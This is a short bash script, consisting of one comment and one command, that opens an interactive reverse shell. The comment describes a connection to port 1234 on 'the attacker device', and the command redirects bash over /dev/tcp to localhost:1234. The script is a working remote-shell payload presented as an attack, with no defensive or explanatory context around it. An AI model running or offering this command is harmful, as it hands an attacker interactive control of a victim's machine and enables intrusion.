#!/bin/bash

# Opens a interactive BASH connecting to port 1234 in the attacker device by creatting a TCP socket
bash -i >& /dev/tcp/localhost/1234 0>&1
